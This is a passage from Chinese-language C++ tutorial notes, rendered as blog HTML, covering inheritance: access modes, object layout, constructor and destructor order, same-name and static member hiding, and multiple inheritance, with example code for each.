&lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Python页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Python下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Python py;</span><br><span class="line">	py.<span class="built_in">header</span>();</span><br><span class="line">	py.<span class="built_in">footer</span>();</span><br><span class="line">	py.<span class="built_in">left</span>();</span><br><span class="line">	py.<span class="built_in">content</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//C++页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;C++下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	CPP cp;</span><br><span class="line">	cp.<span class="built_in">header</span>();</span><br><span class="line">	cp.<span class="built_in">footer</span>();</span><br><span class="line">	cp.<span class="built_in">left</span>();</span><br><span class="line">	cp.<span class="built_in">content</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>继承实现：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//公共页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BasePage</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">header</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">footer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Java页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Java</span> : <span class="keyword">public</span> BasePage</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;JAVA学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Python页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Python</span> : <span class="keyword">public</span> BasePage</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Python学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//C++页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CPP</span> : <span class="keyword">public</span> BasePage</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;C++学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//Java页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Java下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Java ja;</span><br><span class="line">	ja.<span class="built_in">header</span>();</span><br><span class="line">	ja.<span class="built_in">footer</span>();</span><br><span class="line">	ja.<span class="built_in">left</span>();</span><br><span class="line">	ja.<span class="built_in">content</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Python页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Python下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Python py;</span><br><span class="line">	py.<span class="built_in">header</span>();</span><br><span class="line">	py.<span class="built_in">footer</span>();</span><br><span class="line">	py.<span class="built_in">left</span>();</span><br><span class="line">	py.<span class="built_in">content</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//C++页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;C++下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	CPP cp;</span><br><span class="line">	cp.<span class="built_in">header</span>();</span><br><span class="line">	cp.<span class="built_in">footer</span>();</span><br><span class="line">	cp.<span class="built_in">left</span>();</span><br><span class="line">	cp.<span class="built_in">content</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>总结：</strong></p>
<p>继承的好处：&#x3D;&#x3D;可以减少重复的代码&#x3D;&#x3D;</p>
<p>class A : public B; </p>
<p>A 类称为子类 或 派生类</p>
<p>B 类称为父类 或 基类</p>
<p><strong>派生类中的成员，包含两大部分</strong>：</p>
<p>一类是从基类继承过来的，一类是自己增加的成员。</p>
<p>从基类继承过过来的表现其共性，而新增的成员体现了其个性。</p>
<h4 id="4-6-2-继承方式"><a href="#4-6-2-继承方式" class="headerlink" title="4.6.2 继承方式"></a>4.6.2 继承方式</h4><p>继承的语法：<code>class 子类 : 继承方式  父类</code></p>
<p><strong>继承方式一共有三种：</strong></p>
<ul>
<li>公共继承</li>
<li>保护继承</li>
<li>私有继承</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/clip_image002.png"
                      alt="img"
                ></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son1</span> :<span class="keyword">public</span> Base1</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		m_A; <span class="comment">//可访问 public权限</span></span><br><span class="line">		m_B; <span class="comment">//可访问 protected权限</span></span><br><span class="line">		<span class="comment">//m_C; //不可访问</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myClass</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son1 s1;</span><br><span class="line">	s<span class="number">1.</span>m_A; <span class="comment">//其他类只能访问到公共权限</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保护继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span>:<span class="keyword">protected</span> Base2</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		m_A; <span class="comment">//可访问 protected权限</span></span><br><span class="line">		m_B; <span class="comment">//可访问 protected权限</span></span><br><span class="line">		<span class="comment">//m_C; //不可访问</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myClass2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son2 s;</span><br><span class="line">	<span class="comment">//s.m_A; //不可访问</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base3</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son3</span>:<span class="keyword">private</span> Base3</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		m_A; <span class="comment">//可访问 private权限</span></span><br><span class="line">		m_B; <span class="comment">//可访问 private权限</span></span><br><span class="line">		<span class="comment">//m_C; //不可访问</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GrandSon3</span> :<span class="keyword">public</span> Son3</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//Son3是私有继承，所以继承Son3的属性在GrandSon3中都无法访问到</span></span><br><span class="line">		<span class="comment">//m_A;</span></span><br><span class="line">		<span class="comment">//m_B;</span></span><br><span class="line">		<span class="comment">//m_C;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>









<h4 id="4-6-3-继承中的对象模型"><a href="#4-6-3-继承中的对象模型" class="headerlink" title="4.6.3 继承中的对象模型"></a>4.6.3 继承中的对象模型</h4><p><strong>问题：</strong>从父类继承过来的成员，哪些属于子类对象中？</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_C; <span class="comment">//私有成员只是被隐藏了，但是还是会继承下去</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> :<span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_D;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;sizeof Son = &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(Son) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<p>利用工具查看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1545881904150.png"
                      alt="1545881904150"
                ></p>
<p>打开工具窗口后，定位到当前CPP文件的盘符</p>
<p>然后输入： cl &#x2F;d1 reportSingleClassLayout查看的类名   所属文件名</p>
<p>效果如下图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1545882158050.png"
                      alt="1545882158050"
                ></p>
<blockquote>
<p>结论： 父类中私有成员也是被子类继承下去了，只是由编译器给隐藏后访问不到</p>
</blockquote>
<h4 id="4-6-4-继承中构造和析构顺序"><a href="#4-6-4-继承中构造和析构顺序" class="headerlink" title="4.6.4 继承中构造和析构顺序"></a>4.6.4 继承中构造和析构顺序</h4><p>子类继承父类后，当创建子类对象，也会调用父类的构造函数</p>
<p>问题：父类和子类的构造和析构顺序是谁先谁后？</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Base</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> : <span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Son</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Son构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Son</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Son析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</span></span><br><span class="line">	Son s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</p>
</blockquote>
<h4 id="4-6-5-继承同名成员处理方式"><a href="#4-6-5-继承同名成员处理方式" class="headerlink" title="4.6.5 继承同名成员处理方式"></a>4.6.5 继承同名成员处理方式</h4><p>问题：当子类与父类出现同名的成员，如何通过子类对象，访问到子类或父类中同名的数据呢？</p>
<ul>
<li>访问子类同名成员   直接访问即可</li>
<li>访问父类同名成员   需要加作用域</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_A = <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base - func()调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base - func(int a)调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Son</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_A = <span class="number">200</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//当子类与父类拥有同名的成员函数，子类会隐藏父类中所有版本的同名成员函数</span></span><br><span class="line">	<span class="comment">//如果想访问父类中被隐藏的同名成员函数，需要加父类的作用域</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Son - func()调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son s;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Son下的m_A = &quot;</span> &lt;&lt; s.m_A &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Base下的m_A = &quot;</span> &lt;&lt; s.Base::m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	s.<span class="built_in">func</span>();</span><br><span class="line">	s.Base::<span class="built_in">func</span>();</span><br><span class="line">	s.Base::<span class="built_in">func</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ol>
<li>子类对象可以直接访问到子类中同名成员</li>
<li>子类对象加作用域可以访问到父类同名成员</li>
<li>当子类与父类拥有同名的成员函数，子类会隐藏父类中同名成员函数，加作用域可以访问到父类中同名函数</li>
</ol>
<h4 id="4-6-6-继承同名静态成员处理方式"><a href="#4-6-6-继承同名静态成员处理方式" class="headerlink" title="4.6.6 继承同名静态成员处理方式"></a>4.6.6 继承同名静态成员处理方式</h4><p>问题：继承中同名的静态成员在子类对象上如何进行访问？</p>
<p>静态成员和非静态成员出现同名，处理方式一致</p>
<ul>
<li>访问子类同名成员   直接访问即可</li>
<li>访问父类同名成员   需要加作用域</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base - static void func()&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Base - static void func(int a)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Base::m_A = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Son - static void func()&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Son::m_A = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同名成员属性</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//通过对象访问</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;通过对象访问： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Son s;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; s.m_A &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Base 下 m_A = &quot;</span> &lt;&lt; s.Base::m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//通过类名访问</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;通过类名访问： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; Son::m_A &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Base 下 m_A = &quot;</span> &lt;&lt; Son::Base::m_A &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同名成员函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//通过对象访问</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;通过对象访问： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Son s;</span><br><span class="line">	s.<span class="built_in">func</span>();</span><br><span class="line">	s.Base::<span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;通过类名访问： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Son::<span class="built_in">func</span>();</span><br><span class="line">	Son::Base::<span class="built_in">func</span>();</span><br><span class="line">	<span class="comment">//出现同名，子类会隐藏掉父类中所有同名成员函数，需要加作作用域访问</span></span><br><span class="line">	Son::Base::<span class="built_in">func</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：同名静态成员处理方式和非静态处理方式一样，只不过有两种访问的方式（通过对象 和 通过类名）</p>
</blockquote>
<h4 id="4-6-7-多继承语法"><a href="#4-6-7-多继承语法" class="headerlink" title="4.6.7 多继承语法"></a>4.6.7 多继承语法</h4><p>C++允许<strong>一个类继承多个类</strong></p>
<p>语法：<code> class 子类 ：继承方式 父类1 ， 继承方式 父类2...</code></p>
<p>多继承可能会引发父类中有同名成员出现，需要加作用域区分</p>
<p><strong>C++实际开发中不建议用多继承</strong></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base1</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_A = <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base2</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_A = <span class="number">200</span>;  <span class="comment">//开始是m_B 不会出问题，但是改为mA就会出现不明确</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//语法：class 子类：继承方式 父类1 ，继承方式 父类2 </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> : <span class="keyword">public</span> Base2, <span class="keyword">public</span> Base1 </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Son</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		m_C = <span class="number">300</span>;</span><br><span class="line">		m_D = <span class="number">400</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">	<span class="type">int</span> m_D;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//多继承容易产生成员同名的情况</span></span><br><span class="line"><span class="comment">//通过使用类名作用域可以区分调用哪一个基类的成员</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son s;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;sizeof Son = &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(s) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; s.Base1::m_A &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; s.Base2::m_A &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span 